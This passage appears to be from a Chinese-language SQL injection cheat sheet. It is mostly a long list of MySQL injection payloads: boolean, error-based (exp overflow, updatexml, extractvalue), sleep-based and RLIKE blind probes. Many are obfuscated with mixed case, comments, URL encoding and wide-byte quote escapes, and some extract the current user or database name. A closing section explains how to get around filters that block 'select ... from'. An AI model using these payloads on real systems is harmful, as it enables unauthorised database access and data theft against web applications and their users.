1"||case%20when%201=1%20then%201%20else%201/0%20end||"
1"||case%20when%201=2%20then%201%20else%201/0%20end||"
1"||case%20when%20ascii(substr(user,1,1))=65%20then%201%20else%201/0%20end||"
1"||case%20when%20ascii(substr(user,1,1))=65%20then%200%20else%201/1%20end||"
1"||case%20when%201=1%20then%20''%20else%20'aaaaa'%20end||"
1"||case%20when%201=0%20then%20''%20else%20'aaaaa'%20end||"
1")||case%20when%201=1%20then%201%20else%201/0%20end||("
1")||case%20when%201=2%20then%201%20else%201/0%20end||("
1")||case%20when%201=1%20then%20''%20else%20'aaaaa'%20end||("
1")||case%20when%201=2%20then%20''%20else%20'aaaaa'%20end||("
1')||case%20when%201=1%20then%201%20else%201/0%20end||('
1')||case%20when%201=2%20then%201%20else%201/0%20end||('
1')||case%20when%201=1%20then%20''%20else%20'aaaaa'%20end||('
1')||case%20when%201=2%20then%20''%20else%20'aaaaa'%20end||('
1||exp(709)
1||exp(710)
1'||EXp(710)||'
1'||EXp(709)||'
1"||EXp(710)||"
1"||EXp(709)||"
1")||EXp(710)||("
1")||EXp(709)||("
1')||EXp(710)||('
1')||EXp(709)||('
1||SlEeP(If(1=1,4,0))
1||SlEeP(If(1=1,0,4))
1'||SlEeP(If(1=1,4,0))||'
1'||SlEeP(If(1=1,0,4))||'
1"||SlEeP(If(1=1,4,0))||"
1"||SlEeP(If(1=1,0,4))||"
1")||SlEeP(If(1=1,4,0))||("
1")||SlEeP(If(1=1,0,4))||("
1')||SlEeP(If(1=1,4,0))||('
1')||SlEeP(If(1=1,0,4))||('
1%df'||SlEeP(If(1=1,4,0))--+
1%df'||SlEeP(If(1=1,0,4))--+
1/If(1=1,SlEeP(4),0)
1/If(1=2,SlEeP(4),0)
1'/If(1=1,SlEeP(4),0)||'
1'/If(1=2,SlEeP(4),0)||'
1"/If(1=1,SlEeP(4),0)||"
1"/If(1=2,SlEeP(4),0)||"
1')/If(1=1,SlEeP(4),0)||('
1')/If(1=2,SlEeP(4),0)||('
1")/If(1=1,SlEeP(4),0)||("
1")/If(1=2,SlEeP(4),0)||("
1%df'/If(1=1,SlEeP(4),0)--+
1%df'/If(1=2,SlEeP(4),0)--+
1%df'||EXp(710)--+
1%df'||EXp(709)--+
1 AnD If(1=2,EXp(710),EXp(709))
1 AnD If(1=2,EXp(709),EXp(710))
1 AnD SElEcT If(1=2,EXp(710),EXp(709))
1 AnD SElEcT If(1=1,EXp(710),EXp(709))
1'AnD If(1=2,EXp(710),EXp(709))||'
1'AnD If(1=2,EXp(709),EXp(710))||'
1'AnD SElEcT If(1=2,EXp(710),EXp(709))||'
1'AnD SElEcT If(1=1,EXp(710),EXp(709))||'
1"AnD If(1=2,EXp(710),EXp(709))||"
1"AnD If(1=2,EXp(709),EXp(710))||"
1"AnD SElEcT If(1=2,EXp(710),EXp(709))||"
1"AnD SElEcT If(1=1,EXp(710),EXp(709))||"
1")AnD If(1=2,EXp(710),EXp(709))||("
1")AnD If(1=2,EXp(709),EXp(710))||("
1")AnD SElEcT If(1=2,EXp(710),EXp(709))||("
1")AnD SElEcT If(1=1,EXp(710),EXp(709))||("
1')AnD If(1=2,EXp(710),EXp(709))||('
1')AnD If(1=2,EXp(709),EXp(710))||('
1')AnD SElEcT If(1=2,EXp(710),EXp(709))||('
1')AnD SElEcT If(1=1,EXp(710),EXp(709))||('
1'AnD If(1=2,EXp(710),EXp(709))And'1'='1
1'AnD If(1=2,EXp(709),EXp(710))And'1'='1
1'AnD SElEcT If(1=2,EXp(710),EXp(709))And'1'='1
1'AnD SElEcT If(1=1,EXp(710),EXp(709))And'1'='1
1"AnD If(1=2,EXp(710),EXp(709))And"1"="1
1"AnD If(1=2,EXp(709),EXp(710))And"1"="1
1"AnD SElEcT If(1=2,EXp(710),EXp(709))And"1"="1
1"AnD SElEcT If(1=1,EXp(710),EXp(709))And"1"="1
1")AnD If(1=2,EXp(710),EXp(709))And("1")=("1=
1")AnD If(1=2,EXp(709),EXp(710))And("1")=("1=
1")AnD SElEcT If(1=2,EXp(710),EXp(709))And("1")=("1=
1")AnD SElEcT If(1=1,EXp(710),EXp(709))And("1")=("1=
1')AnD If(1=2,EXp(710),EXp(709))And('1')=('1=
1')AnD If(1=1,EXp(710),EXp(709))And('1')=('1=
1')AnD If(1=2,EXp(709),EXp(710))And("1")=("1=
1')AnD SElEcT If(1=2,EXp(710),EXp(709))And('1')=('1=
1')AnD SElEcT If(1=1,EXp(710),EXp(709))And('1')=('1=
1"||uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)||"
1'|uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)|'
1'or updatexml(1,if(1=2,1,user()),1)||'
1')||uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)||('
1")||uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)||("
1 RLIKE (SELECT (CASE WHEN (5925=5925) THEN 1 ELSE 0x28 END))
1 RLIKE (SELECT (CASE WHEN (5925=5924) THEN 1 ELSE 0x28 END))
1'AnD%20uPdaTeXml(1,CoNCAt(0x7e,(SElEcT%20database()),0x7e),1)--+
1'%20Or%20ExtRacTvaLue(1,CoNCAt(0x7e,(database())))%20Or%20'
1"AnDExtRacTvaLue(1,CoNCAt(char(126),md5(1152290333)))AnD"
ExtRacTvaLue(1,CoNCAt(char(126),md5(1832632439)))
1%20AnD%201329=(SElEcT%20(CASE%20WHEN%20(ORD(MID((IfNULL(CAST(DATABASE()%20AS%20NCHAR),0x20)),1,1))>123)%20THEN%201329%20ELSE%20(SElEcT%203541%20uNIoN%20SElEcT%209185)%20END))--+
1%20AnD%201329=(SElEcT%20(CASE%20WHEN%20(ORD(MID((IfNULL(CAST(DATABASE()%20AS%20NCHAR),0x20)),1,1))<123)%20THEN%201329%20ELSE%20(SElEcT%203541%20uNIoN%20SElEcT%209185)%20END))--+
1=SlEeP(5)
1'=SlEeP(5)%20Or%20'1
1"=SlEeP(5)%20Or%20"1
1'Or%20SlEeP(5)='1
1')=SlEeP(5)%20Or%20('1
1")=SlEeP(5)%20Or%20("1
1 AnD cast(md5('1500755628')asint)>0
1"AnD(SElEcT*from(SElEcT%20SlEeP/**/(5))a/**/uNIoN/**/SElEcT%201)="
1'AnD(SElEcT*from(SElEcT%20SlEeP/**/(5))a/**/uNIoN/**/SElEcT%201)='
1')AnD(SElEcT*from(SElEcT%20SlEeP/**/(5))a/**/uNIoN/**/SElEcT%201)=('
1")AnD(SElEcT*from(SElEcT%20SlEeP/**/(5))a/**/uNIoN/**/SElEcT%201)=("
1%20AnD%20(SElEcT%208380%20FROM%20(SElEcT(SlEeP(5)))smWE)
1)%20AnD%20(SElEcT*from(SElEcT(SlEeP(5)))a)--+
1'AnD%20(SElEcT%208380%20FROM%20(SElEcT(SlEeP(5)))smWE)
1/**/AnD%200=7
1/**/AnD%200=0
```

#### 对select和from的过滤突破

* 使用类似正则`select\s*.*\s*from`，过滤掉了`select+空白字符+from`的组合。不能使用select难以注出表中的字段，可以考虑如下方式绕过

```mysql
# order by后为注入部分
SELECT * FROM user_info ORDER BY if(-99=(SELECT-0-ASCII(SUBSTRING('abc123', 3, 1))-0e0from user_info WHERE id=1),EXP(9999999),RAND(1));

# 原理是select可以无需空白字符拼接一些数字型的数据
select-1-\Nfrom user;
select-0.0from user;
select-1-0e0from user;


# 此外还有 --\r\n和内联注释
select--\r\n* from--\r\npg_database;
/*!50000select*/ * /*!50000from*/user;
```



